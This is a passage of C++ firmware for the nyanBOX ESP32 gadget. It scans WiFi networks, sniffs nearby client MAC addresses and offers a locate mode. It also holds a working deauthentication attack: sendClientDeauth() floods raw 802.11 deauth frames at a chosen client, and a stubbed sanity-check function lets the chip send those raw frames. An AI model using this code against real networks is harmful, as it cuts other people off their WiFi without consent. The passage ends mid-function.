/*
    nyanBOX by Nyan Devices
    https://github.com/jbohack/nyanBOX
    Copyright (c) 2025 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include "../include/wifiscan.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "../include/setting.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include <vector>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

namespace {

#define BTN_UP BUTTON_PIN_UP
#define BTN_DOWN BUTTON_PIN_DOWN
#define BTN_RIGHT BUTTON_PIN_RIGHT
#define BTN_BACK BUTTON_PIN_LEFT

struct WiFiClientData {
  char clientMAC[18];
  int8_t rssi;
  unsigned long lastSeen;
  uint16_t packetCount;
  uint8_t frameTypes;
};

struct WiFiNetworkData {
  char ssid[33];
  char bssid[18];
  int8_t rssi;
  uint8_t channel;
  uint8_t encryption;
  unsigned long lastSeen;
  char authMode[20];
  std::vector<WiFiClientData> clients;
  uint8_t clientCount;
};
std::vector<WiFiNetworkData> wifiNetworks;

const int MAX_NETWORKS = 100;
const int MAX_CLIENTS_PER_AP = 10;
const int MAX_TOTAL_CLIENTS = 100;
const unsigned long CLIENT_TIMEOUT = 300000;

#define FRAME_TYPE_DATA 0x01
#define FRAME_TYPE_ASSOC 0x02

enum ScanPhase {
  PHASE_AP_SCAN,
  PHASE_CLIENT_SCAN,
  PHASE_IDLE
};

int currentIndex = 0;
int listStartIndex = 0;
bool isDetailView = false;
bool isLocateMode = false;
bool isClientsView = false;
bool isClientDetailView = false;
bool isClientDeauthMode = false;
int currentClientIndex = 0;
int clientListStartIndex = 0;
char locateTargetBSSID[18] = {0};
uint8_t locateTargetChannel = 0;
char deauthTargetClientMAC[18] = {0};
char deauthTargetAPBSSID[18] = {0};
uint8_t deauthTargetChannel = 0;
unsigned long lastDeauthTime = 0;
unsigned long deauthPacketCount = 0;
const unsigned long DEAUTH_INTERVAL = 5;
unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

bool wifiscan_isScanning = false;
uint16_t wifiscan_lastApCount = 0;

static bool needsRedraw = true;
static unsigned long lastLocateUpdate = 0;
const unsigned long locateUpdateInterval = 1000;

ScanPhase currentScanPhase = PHASE_AP_SCAN;
unsigned long phaseStartTime = 0;
unsigned long lastAPScanTime = 0;

const unsigned long AP_SCAN_DURATION = 8000;
const unsigned long CLIENT_SCAN_DURATION = 8000;
const unsigned long IDLE_DURATION = 14000;
const unsigned long scanInterval = 180000;

const unsigned long CHANNEL_HOP_INTERVAL = 500;
unsigned long lastChannelHop = 0;
unsigned long lastClientCleanup = 0;
const unsigned long CLIENT_CLEANUP_INTERVAL = 30000;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}

void macStringToBytes(const char* macStr, uint8_t* macBytes) {
    if (macStr == nullptr || macBytes == nullptr) return;

    unsigned int values[6];
    if (sscanf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x",
               &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            macBytes[i] = (uint8_t)values[i];
        }
    }
}

void sendClientDeauth() {
    uint8_t deauthFrame[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x01, 0x00
    };

    uint8_t clientMAC[6];
    uint8_t apBSSID[6];

    macStringToBytes(deauthTargetClientMAC, clientMAC);
    macStringToBytes(deauthTargetAPBSSID, apBSSID);

    memcpy(deauthFrame + 4, clientMAC, 6);
    memcpy(deauthFrame + 10, apBSSID, 6);
    memcpy(deauthFrame + 16, apBSSID, 6);

    esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);

    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        delay(1);
    }

    deauthPacketCount += 10;
}

const char* getAuthModeString(wifi_auth_mode_t authMode) {
    switch (authMode) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA-PSK";
        case WIFI_AUTH_WPA2_PSK: return "WPA2-PSK";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-Ent";
        case WIFI_AUTH_WPA3_PSK: return "WPA3-PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
        case WIFI_AUTH_WAPI_PSK: return "WAPI-PSK";
        default: return "Unknown";
    }
}

void bssid_to_string(uint8_t *bssid, char *str, size_t size) {
    if (bssid == NULL || str == NULL || size < 18) {
        return;
    }
    snprintf(str, size, "%02x:%02x:%02x:%02x:%02x:%02x",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
}

bool isValidClientMAC(const char* mac) {
    if (mac == nullptr || mac[0] == '\0') return false;

    if (strcasecmp(mac, "ff:ff:ff:ff:ff:ff") == 0) return false;

    if (strcasecmp(mac, "00:00:00:00:00:00") == 0) return false;

    char firstByte[3] = {mac[0], mac[1], '\0'};
    unsigned int byte = 0;
    sscanf(firstByte, "%x", &byte);
    if (byte & 0x01) return false;

    return true;
}

WiFiNetworkData* findAPByBSSID(const char* bssid) {
    if (bssid == nullptr || bssid[0] == '\0') return nullptr;

    for (auto &ap : wifiNetworks) {
        if (strcasecmp(ap.bssid, bssid) == 0) {
            return &ap;
        }
    }
    return nullptr;
}

void removeOldestClient(WiFiNetworkData* ap) {
    if (ap == nullptr || ap->clients.empty()) return;

    auto oldest = ap->clients.begin();
    for (auto it = ap->clients.begin(); it != ap->clients.end(); ++it) {
        if (it->lastSeen < oldest->lastSeen) {
            oldest = it;
        }
    }
    ap->clients.erase(oldest);
}

void addOrUpdateClient(const char* apBSSID, const char* clientMAC, int8_t rssi, uint8_t frameType) {
    if (!isValidClientMAC(clientMAC)) return;

    WiFiNetworkData* ap = findAPByBSSID(apBSSID);
    if (ap == nullptr) return;

    unsigned long now = millis();

    for (auto &client : ap->clients) {
        if (strcmp(client.clientMAC, clientMAC) == 0) {
            client.rssi = rssi;
            client.lastSeen = now;
            client.packetCount++;
            client.frameTypes |= frameType;
            return;
        }
    }

    int totalClients = 0;
    for (const auto &network : wifiNetworks) {
        totalClients += network.clients.size();
    }

    if (ap->clients.size() >= MAX_CLIENTS_PER_AP) {
        removeOldestClient(ap);
    } else if (totalClients >= MAX_TOTAL_CLIENTS) {
        WiFiNetworkData* oldestAP = nullptr;
        WiFiClientData* oldestClient = nullptr;
        unsigned long oldestTime = now;

        for (auto &network : wifiNetworks) {
            for (auto &client : network.clients) {
                if (client.lastSeen < oldestTime) {
                    oldestTime = client.lastSeen;
                    oldestClient = &client;
                    oldestAP = &network;
                }
            }
        }

        if (oldestAP != nullptr && oldestClient != nullptr) {
            oldestAP->clients.erase(
                std::remove_if(oldestAP->clients.begin(), oldestAP->clients.end(),
                    [oldestClient](const WiFiClientData &c) {
                        return strcmp(c.clientMAC, oldestClient->clientMAC) == 0;
                    }),
                oldestAP->clients.end()
            );
            oldestAP->clientCount = oldestAP->clients.size();
        }
    }

    WiFiClientData newClient;
    strncpy(newClient.clientMAC, clientMAC, sizeof(newClient.clientMAC) - 1);
    newClient.clientMAC[sizeof(newClient.clientMAC) - 1] = '\0';
    newClient.rssi = rssi;
    newClient.lastSeen = now;
    newClient.packetCount = 1;
    newClient.frameTypes = frameType;

    ap->clients.push_back(newClient);
    ap->clientCount = ap->clients.size();
}

void cleanupStaleClients() {
    unsigned long now = millis();

    for (auto &ap : wifiNetworks) {
        ap.clients.erase(
            std::remove_if(ap.clients.begin(), ap.clients.end(),
                [now](const WiFiClientData &client) {
                    return (now - client.lastSeen) > CLIENT_TIMEOUT;
                }),
            ap.clients.end()
        );
        ap.clientCount = ap.clients.size();
    }
}

static void IRAM_ATTR wifi_client_sniffer_callback(void* buff, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
    const uint8_t *frame = ppkt->payload;
    int len = ppkt->rx_ctrl.sig_len;

    if (len < 24) return;

    uint8_t frameType = frame[0] & 0x0C;
    uint8_t frameSubtype = frame[0] & 0xF0;

    char clientMAC[18];
    char apBSSID[18];

    if (frameType == 0x08) {
        bool toDS = frame[1] & 0x01;
        bool fromDS = frame[1] & 0x02;

        if (toDS && !fromDS) {
            bssid_to_string((uint8_t*)&frame[10], clientMAC, sizeof(clientMAC));
            bssid_to_string((uint8_t*)&frame[4], apBSSID, sizeof(apBSSID));
            addOrUpdateClient(apBSSID, clientMAC, ppkt->rx_ctrl.rssi, FRAME_TYPE_DATA);
        }
        else if (!toDS && fromDS) {
            bssid_to_string((uint8_t*)&frame[4], clientMAC, sizeof(clientMAC));
            bssid_to_string((uint8_t*)&frame[10], apBSSID, sizeof(apBSSID));
            addOrUpdateClient(apBSSID, clientMAC, ppkt->rx_ctrl.rssi, FRAME_TYPE_DATA);
        }
    }
    else if (frameType == 0x00) {
        if (len < 26) return;

        if (frameSubtype == 0x10) {
            uint16_t statusCode = frame[24] | (frame[25] << 8);
            if (statusCode == 0) {
                bssid_to_string((uint8_t*)&frame[4], clientMAC, sizeof(clientMAC));
                bssid_to_string((uint8_t*)&frame[16], apBSSID, sizeof(apBSSID));
                addOrUpdateClient(apBSSID, clientMAC, ppkt->rx_ctrl.rssi, FRAME_TYPE_ASSOC);
            }
        }
        else if (frameSubtype == 0x30) {
            uint16_t statusCode = frame[24] | (frame[25] << 8);
            if (statusCode == 0) {
                bssid_to_string((uint8_t*)&frame[4], clientMAC, sizeof(clientMAC));
                bssid_to_string((uint8_t*)&frame[16], apBSSID, sizeof(apBSSID));
                addOrUpdateClient(apBSSID, clientMAC, ppkt->rx_ctrl.rssi, FRAME_TYPE_ASSOC);
            }
        }
    }
}

void hopToNextAPChannel() {
    if (wifiNetworks.empty()) return;

    unsigned long now = millis();
    if (now - lastChannelHop < CHANNEL_HOP_INTERVAL) return;

    static uint8_t uniqueChannels[14];
    static int uniqueCount = 0;
    static int currentUniqueIndex = 0;

    static unsigned long lastRebuild = 0;
    if (now - lastRebuild > 5000 || uniqueCount == 0) {
        uniqueCount = 0;
        for (const auto &ap : wifiNetworks) {
            bool found = false;
            for (int i = 0; i < uniqueCount; i++) {
                if (uniqueChannels[i] == ap.channel) {
                    found = true;
                    break;
                }
            }
            if (!found && uniqueCount < 14) {
                uniqueChannels[uniqueCount++] = ap.channel;
            }
        }
        currentUniqueIndex = 0;
        lastRebuild = now;
    }

    if (uniqueCount > 0) {
        currentUniqueIndex = (currentUniqueIndex + 1) % uniqueCount;
        esp_wifi_set_channel(uniqueChannels[currentUniqueIndex], WIFI_SECOND_CHAN_NONE);
        lastChannelHop = now;
    }
}

void processScanResults(unsigned long now) {
    uint16_t number = 0;
    esp_wifi_scan_get_ap_num(&number);
    
    if (number == 0) return;
    
    wifi_ap_record_t *ap_info = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * number);
    
    if (ap_info == NULL) return;
    
    memset(ap_info, 0, sizeof(wifi_ap_record_t) * number);
    
    uint16_t actual_number = number;
    esp_err_t err = esp_wifi_scan_get_ap_records(&actual_number, ap_info);
    
    if (err == ESP_OK) {
        for (int i = 0; i < actual_number; i++) {
            if (ap_info[i].ssid[0] == '\0') {
                continue;
            }

            char bssidStr[18];
            bssid_to_string(ap_info[i].bssid, bssidStr, sizeof(bssidStr));

            if (isLocateMode && strlen(locateTargetBSSID) > 0) {
                if (strcmp(bssidStr, locateTargetBSSID) != 0) {
                    continue;
                }
            } else if (wifiNetworks.size() >= MAX_NETWORKS) {
                continue;
            }

            bool found = false;
            for (auto &net : wifiNetworks) {
                if (strcmp(net.bssid, bssidStr) == 0) {
                    net.rssi = ap_info[i].rssi;
                    net.lastSeen = now;
                    strncpy(net.ssid, (char*)ap_info[i].ssid, sizeof(net.ssid) - 1);
                    net.ssid[sizeof(net.ssid) - 1] = '\0';
                    found = true;
                    break;
                }
            }

            if (!found) {
                WiFiNetworkData newNetwork;
                memset(&newNetwork, 0, sizeof(newNetwork));
                strncpy(newNetwork.bssid, bssidStr, sizeof(newNetwork.bssid) - 1);
                newNetwork.bssid[sizeof(newNetwork.bssid) - 1] = '\0';
                newNetwork.rssi = ap_info[i].rssi;
                newNetwork.channel = ap_info[i].primary;
                newNetwork.encryption = ap_info[i].authmode;
                newNetwork.lastSeen = now;
                newNetwork.clientCount = 0;

                strncpy(newNetwork.authMode, getAuthModeString(ap_info[i].authmode), sizeof(newNetwork.authMode) - 1);
                newNetwork.authMode[sizeof(newNetwork.authMode) - 1] = '\0';

                strncpy(newNetwork.ssid, (char*)ap_info[i].ssid, sizeof(newNetwork.ssid) - 1);
                newNetwork.ssid[sizeof(newNetwork.ssid) - 1] = '\0';

                wifiNetworks.push_back(newNetwork);
            }
        }

        if (!isLocateMode) {
            std::sort(wifiNetworks.begin(), wifiNetworks.end(),
                    [](const WiFiNetworkData &a, const WiFiNetworkData &b) {
                        return a.rssi > b.rssi;
                    });
        }
    }
    
    free(ap_info);
}

}

void wifiscanSetup() {
  wifiNetworks.clear();
  wifiNetworks.reserve(MAX_NETWORKS);
  currentIndex = listStartIndex = 0;
  isDetailView = false;
  isLocateMode = false;
  isClientsView = false;
  isClientDetailView = false;
  currentClientIndex = 0;
  clientListStartIndex = 0;
  memset(locateTargetBSSID, 0, sizeof(locateTargetBSSID));
  locateTargetChannel = 0;
  lastButtonPress = 0;
  wifiscan_isScanning = false;
  wifiscan_lastApCount = 0;
  needsRedraw = true;
  lastLocateUpdate = 0;

  currentScanPhase = PHASE_AP_SCAN;
  phaseStartTime = millis();
  lastChannelHop = 0;
  lastClientCleanup = 0;
  lastAPScanTime = 0;

  u8g2.begin();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.clearBuffer();
  u8g2.drawStr(0, 10, "Scanning for");
  u8g2.drawStr(0, 20, "WiFi networks...");
  char countStr[32];
  snprintf(countStr, sizeof(countStr), "%d/%d networks", 0, MAX_NETWORKS);
  u8g2.drawStr(0, 35, countStr);
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 60, "Press SEL to exit");
  u8g2.sendBuffer();
  displayMirrorSend(u8g2);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);

  wifi_scan_config_t scan_config = {
    .ssid = NULL,
    .bssid = NULL,
    .channel = 0,
    .show_hidden = false,
    .scan_type = WIFI_SCAN_TYPE_ACTIVE,
    .scan_time = {
      .active = {
        .min = 120,
        .max = 200
      }
    }
  };
  
  esp_wifi_scan_start(&scan_config, false);
  wifiscan_isScanning = true;
}

void wifiscanCleanup() {
  if (wifiscan_isScanning) {
    esp_wifi_scan_stop();
    wifiscan_isScanning = false;
  }

  esp_wifi_set_promiscuous(false);

  if (isClientDeauthMode || isLocateMode) {
    esp_wifi_set_mode(WIFI_MODE_STA);
    delay(100);
  }

  isDetailView = false;
  isLocateMode = false;
  isClientsView = false;
  isClientDetailView = false;
  isClientDeauthMode = false;

  memset(locateTargetBSSID, 0, sizeof(locateTargetBSSID));
  locateTargetChannel = 0;
  memset(deauthTargetClientMAC, 0, sizeof(deauthTargetClientMAC));
  memset(deauthTargetAPBSSID, 0, sizeof(deauthTargetAPBSSID));
  deauthTargetChannel = 0;
  deauthPacketCount = 0;

  currentScanPhase = PHASE_AP_SCAN;
  phaseStartTime = 0;
  lastAPScanTime = 0;
  lastChannelHop = 0;
  lastClientCleanup = 0;

  wifi_mode_t mode;
  if (esp_wifi_get_mode(&mode) == ESP_OK) {
    esp_wifi_stop();
    delay(50);
    esp_wifi_deinit();
    delay(100);
  }

  esp_netif_t* sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
  if (sta_netif != NULL) {
    esp_netif_destroy(sta_netif);
  }

  esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
  if (ap_netif != NULL) {
    esp_netif_destroy(ap_netif);
  }

  delay(100);
}

void wifiscanLoop() {
  unsigned long now = millis();

  static bool wasInSubmenu = false;
  bool inMainMenu = !isDetailView && !isClientsView && !isLocateMode;

  if (inMainMenu && wasInSubmenu && (now - lastAPScanTime >= scanInterval)) {
    if (wifiscan_isScanning) {
      esp_wifi_scan_stop();
      wifiscan_isScanning = false;
    }

    esp_wifi_set_promiscuous(false);

    wifi_scan_config_t scan_config = {
      .ssid = NULL,
      .bssid = NULL,
      .channel = 0,
      .show_hidden = false,
      .scan_type = WIFI_SCAN_TYPE_ACTIVE,
      .scan_time = {
        .active = {
          .min = 120,
          .max = 200
        }
      }
    };
    esp_wifi_scan_start(&scan_config, false);
    wifiscan_isScanning = true;
    wifiscan_lastApCount = 0;

    currentScanPhase = PHASE_AP_SCAN;
    phaseStartTime = now;
    lastAPScanTime = now;
    needsRedraw = true;
  }

  wasInSubmenu = !inMainMenu;

  if (!isLocateMode && !isClientDeauthMode) {
    unsigned long phaseElapsed = now - phaseStartTime;

    switch (currentScanPhase) {
      case PHASE_AP_SCAN: {
        esp_wifi_set_promiscuous(false);

        uint16_t currentApCount = 0;
        esp_wifi_scan_get_ap_num(&currentApCount);
        if (currentApCount > wifiscan_lastApCount) {
          processScanResults(now);
          wifiscan_lastApCount = currentApCount;
        }

        if (!isDetailView && !isClientsView) {
          if (phaseElapsed >= AP_SCAN_DURATION) {
            lastAPScanTime = now;
            processScanResults(now);

            if (wifiscan_isScanning) {
              esp_wifi_scan_stop();
              wifiscan_isScanning = false;
            }

            needsRedraw = true;

            esp_wifi_set_promiscuous(true);
            wifi_promiscuous_filter_t flt = {
              .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
            };
            esp_wifi_set_promiscuous_filter(&flt);
            esp_wifi_set_promiscuous_rx_cb(&wifi_client_sniffer_callback);

            currentScanPhase = PHASE_CLIENT_SCAN;
            phaseStartTime = now;
            lastChannelHop = now;
          }
        } else {
          if (wifiscan_isScanning) {
            esp_wifi_scan_stop();
            wifiscan_isScanning = false;
          }

          esp_wifi_set_promiscuous(true);
          wifi_promiscuous_filter_t flt = {
            .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
          };
          esp_wifi_set_promiscuous_filter(&flt);
          esp_wifi_set_promiscuous_rx_cb(&wifi_client_sniffer_callback);

          currentScanPhase = PHASE_CLIENT_SCAN;
          phaseStartTime = now;
          lastChannelHop = now;
        }
      }
      break;

      case PHASE_CLIENT_SCAN:
        hopToNextAPChannel();

        if (phaseElapsed >= CLIENT_SCAN_DURATION) {
          esp_wifi_set_promiscuous(false);

          currentScanPhase = PHASE_IDLE;
          phaseStartTime = now;
        }
        break;

      case PHASE_IDLE:
        if (phaseElapsed >= IDLE_DURATION) {
          cleanupStaleClients();
          lastClientCleanup = now;

          bool shouldScanAPs = (now - lastAPScanTime >= scanInterval) && !isDetailView && !isClientsView;

          if (shouldScanAPs) {
            currentScanPhase = PHASE_AP_SCAN;
            phaseStartTime = now;
            lastAPScanTime = now;
            needsRedraw = true;

            esp_wifi_set_promiscuous(false);

            if (!wifiscan_isScanning) {
              wifi_scan_config_t scan_config = {
                .ssid = NULL,
                .bssid = NULL,
                .channel = 0,
                .show_hidden = false,
                .scan_type = WIFI_SCAN_TYPE_ACTIVE,
                .scan_time = {
                  .active = {
                    .min = 120,
                    .max = 200
                  }
                }
              };
              esp_wifi_scan_start(&scan_config, false);
              wifiscan_isScanning = true;
              wifiscan_lastApCount = 0;
            }
          } else {
            esp_wifi_set_promiscuous(true);
            wifi_promiscuous_filter_t flt = {
              .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
            };
            esp_wifi_set_promiscuous_filter(&flt);
            esp_wifi_set_promiscuous_rx_cb(&wifi_client_sniffer_callback);

            currentScanPhase = PHASE_CLIENT_SCAN;
            phaseStartTime = now;
            lastChannelHop = now;
          }
        }
        break;
    }
  }

  if (!isLocateMode && !isClientDeauthMode && now - lastClientCleanup >= CLIENT_CLEANUP_INTERVAL) {
    cleanupStaleClients();
    lastClientCleanup = now;
  }

  if (isClientDeauthMode) {
    if (now - lastDeauthTime >= DEAUTH_INTERVAL) {
      sendClientDeauth();
      lastDeauthTime = now;
    }
  }

  if (isLocateMode) {
    static unsigned long locateScanStart = 0;
    const unsigned long LOCATE_SCAN_DURATION = 400;

    if (wifiscan_isScanning) {
      uint16_t currentApCount = 0;
      esp_wifi_scan_get_ap_num(&currentApCount);

      if (currentApCount > wifiscan_lastApCount) {
        processScanResults(now);
        wifiscan_lastApCount = currentApCount;
      }

      if (now - locateScanStart >= LOCATE_SCAN_DURATION) {
        esp_wifi_scan_stop();
        wifiscan_isScanning = false;

        processScanResults(now);
      }
    }

    if (!wifiscan_isScanning) {
      wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = locateTargetChannel,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = {
          .active = {
            .min = 120,
            .max = 200
          }
        }
      };
      esp_wifi_scan_start(&scan_config, false);
      wifiscan_isScanning = true;
      wifiscan_lastApCount = 0;
      locateScanStart = now;
    }
  }

  static int lastNetworkCount = -1;
  static bool lastWasScanning = false;

  if (wifiscan_isScanning && !isLocateMode && !isDetailView && !isClientsView) {
    if (!lastWasScanning || lastNetworkCount != (int)wifiNetworks.size()) {
      lastNetworkCount = (int)wifiNetworks.size();
      lastWasScanning = true;

        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "Scanning for");
        u8g2.drawStr(0, 20, "WiFi networks...");

        char countStr[32];
        snprintf(countStr, sizeof(countStr), "%d/%d networks", (int)wifiNetworks.size(), MAX_NETWORKS);
        u8g2.drawStr(0, 35, countStr);

        int barWidth = 120;
        int barHeight = 10;
        int barX = (128 - barWidth) / 2;
        int barY = 42;

        u8g2.drawFrame(barX, barY, barWidth, barHeight);

        int fillWidth = (wifiNetworks.size() * (barWidth - 4)) / MAX_NETWORKS;
        if (fillWidth > 0) {
          u8g2.drawBox(barX + 2, barY + 2, fillWidth, barHeight - 4);
        }

      u8g2.setFont(u8g2_font_5x8_tr);
      u8g2.drawStr(0, 62, "Press SEL to exit");
      u8g2.sendBuffer();
      displayMirrorSend(u8g2);
      needsRedraw = false;
      return;
    }
  } else {
    lastWasScanning = false;
  }

  bool isScanning = (currentScanPhase == PHASE_AP_SCAN && !isDetailView && !isClientsView);

  if (!isScanning && now - lastButtonPress > debounceTime) {
    if (!isDetailView && !isLocateMode && !isClientsView && digitalRead(BTN_UP) == LOW && currentIndex > 0) {
      --currentIndex;
      if (currentIndex < listStartIndex)
        --listStartIndex;
      lastButtonPress = now;
      needsRedraw = true;
    } else if (!isDetailView && !isLocateMode && !isClientsView && digitalRead(BTN_DOWN) == LOW &&
               currentIndex < (int)wifiNetworks.size() - 1) {
      ++currentIndex;
      if (currentIndex >= listStartIndex + 5)
        ++listStartIndex;
      lastButtonPress = now;
      needsRedraw = true;
    } else if (!isDetailView && !isLocateMode && !isClientsView && digitalRead(BTN_RIGHT) == LOW &&
               !wifiNetworks.empty()) {
      isDetailView = true;
      lastButtonPress = now;
      needsRedraw = true;
    } else if (isDetailView && !isLocateMode && !isClientsView && digitalRead(BTN_RIGHT) == LOW &&
               !wifiNetworks.empty()) {
      isLocateMode = true;
      strncpy(locateTargetBSSID, wifiNetworks[currentIndex].bssid, sizeof(locateTargetBSSID) - 1);
      locateTargetBSSID[sizeof(locateTargetBSSID) - 1] = '\0';
      locateTargetChannel = wifiNetworks[currentIndex].channel;

      if (wifiscan_isScanning) {
        esp_wifi_scan_stop();
        wifiscan_isScanning = false;
      }
      esp_wifi_set_promiscuous(false);

      wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = locateTargetChannel,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = {
          .active = {
            .min = 120,
            .max = 200
          }
        }
      };
      esp_wifi_scan_start(&scan_config, false);
      wifiscan_isScanning = true;
      wifiscan_lastApCount = 0;

      lastButtonPress = now;
      lastLocateUpdate = now;
      needsRedraw = true;
    } else if (isLocateMode && digitalRead(BTN_BACK) == LOW) {
      isLocateMode = false;
      memset(locateTargetBSSID, 0, sizeof(locateTargetBSSID));
      locateTargetChannel = 0;

      if (wifiscan_isScanning) {
        esp_wifi_scan_stop();
        wifiscan_isScanning = false;
      }

      esp_wifi_set_promiscuous(true);
      wifi_promiscuous_filter_t flt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
      };
      esp_wifi_set_promiscuous_filter(&flt);
      esp_wifi_set_promiscuous_rx_cb(&wifi_client_sniffer_callback);

      currentScanPhase = PHASE_CLIENT_SCAN;
      phaseStartTime = now;
      lastChannelHop = now;

      lastButtonPress = now;
      needsRedraw = true;
    } else if (isDetailView && !isLocateMode && !isClientsView && digitalRead(BTN_DOWN) == LOW &&
               !wifiNetworks.empty()) {
      isClientsView = true;
      currentClientIndex = 0;
      clientListStartIndex = 0;
      lastButtonPress = now;
      needsRedraw = true;
    } else if (isClientsView && !isClientDetailView && digitalRead(BTN_UP) == LOW && currentClientIndex > 0) {
      --currentClientIndex;
      if (currentClientIndex < clientListStartIndex)
        --clientListStartIndex;
      lastButtonPress = now;
      needsRedraw = true;
    } else if (isClientsView && !isClientDetailView && digitalRead(BTN_DOWN) == LOW &&
               !wifiNetworks.empty() && currentIndex < (int)wifiNetworks.size() &&
               currentClientIndex < (int)wifiNetworks[currentIndex].clients.size() - 1) {
      ++currentClientIndex;
      if (currentClientIndex >= clientListStartIndex + 3)
        ++clientListStartIndex;
      lastButtonPress = now;
      needsRedraw = true;
    } else if (isClientsView && !isClientDetailView && digitalRead(BTN_RIGHT) == LOW &&
               !wifiNetworks.empty() && currentIndex < (int)wifiNetworks.size() &&
               !wifiNetworks[currentIndex].clients.empty()) {
      isClientDetailView = true;
      lastButtonPress = now;
      needsRedraw = true;
    } else if (isClientDetailView && !isClientDeauthMode && digitalRead(BTN_RIGHT) == LOW &&
               !wifiNetworks.empty() && currentIndex < (int)wifiNetworks.size() &&
               currentClientIndex < (int)wifiNetworks[currentIndex].clients.size()) {
      isClientDeauthMode = true;
      auto &client = wifiNetworks[currentIndex].clients[currentClientIndex];
      strncpy(deauthTargetClientMAC, client.clientMAC, sizeof(deauthTargetClientMAC) - 1);
      deauthTargetClientMAC[sizeof(deauthTargetClientMAC) - 1] = '\0';
      strncpy(deauthTargetAPBSSID, wifiNetworks[currentIndex].bssid, sizeof(deauthTargetAPBSSID) - 1);
      deauthTargetAPBSSID[sizeof(deauthTargetAPBSSID) - 1] = '\0';
      deauthTargetChannel = wifiNetworks[currentIndex].channel;
      deauthPacketCount = 0;
      lastDeauthTime = 0;

      if (wifiscan_isScanning) {
        esp_wifi_scan_stop();
        wifiscan_isScanning = false;
      }

      esp_wifi_set_promiscuous(false);
      esp_wifi_set_mode(WIFI_MODE_APSTA);
      delay(100);
      esp_wifi_set_promiscuous(true);

      lastButtonPress = now;
      needsRedraw = true;
    } else if (isClientDeauthMode && digitalRead(BTN_BACK) == LOW) {
      isClientDeauthMode = false;
      memset(deauthTargetClientMAC, 0, sizeof(deauthTargetClientMAC));
      memset(deauthTargetAPBSSID, 0, sizeof(deauthTargetAPBSSID));
      deauthTargetChannel = 0;
      deauthPacketCount = 0;

      esp_wifi_set_promiscuous(false);
      esp_wifi_set_mode(WIFI_MODE_STA);
      delay(100);

      esp_wifi_set_promiscuous(true);
      wifi_promiscuous_filter_t flt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
      };
      esp_wifi_set_promiscuous_filter(&flt);
      esp_wifi_set_promiscuous_rx_cb(&wifi_client_sniffer_callback);

      currentScanPhase = PHASE_CLIENT_SCAN;
      phaseStartTime = now;
      lastChannelHop = now;

      lastButtonPress = now;
      needsRedraw = true;
    } else if (isClientDetailView && !isClientDeauthMode && digitalRead(BTN_BACK) == LOW) {
      isClientDetailView = false;
      lastButtonPress = now;
      needsRedraw = true;
    } else if (isClientsView && !isClientDetailView && digitalRead(BTN_BACK) == LOW) {
      isClientsView = false;
      currentClientIndex = 0;
      clientListStartIndex = 0;
      lastButtonPress = now;
      needsRedraw = true;
    } else if (isDetailView && !isLocateMode && !isClientsView && digitalRead(BTN_BACK) == LOW) {
      isDetailView = false;
      lastButtonPress = now;
      needsRedraw = true;
    }
  }

  if (wifiNetworks.empty()) {
    if (currentIndex != 0 || isDetailView || isLocateMode || isClientsView) {
      needsRedraw = true;
    }
    currentIndex = listStartIndex = 0;
    isDetailView = false;
    isLocateMode = false;
    isClientsView = false;
    isClientDetailView = false;
    currentClientIndex = 0;
    clientListStartIndex = 0;
    memset(locateTargetBSSID, 0, sizeof(locateTargetBSSID));
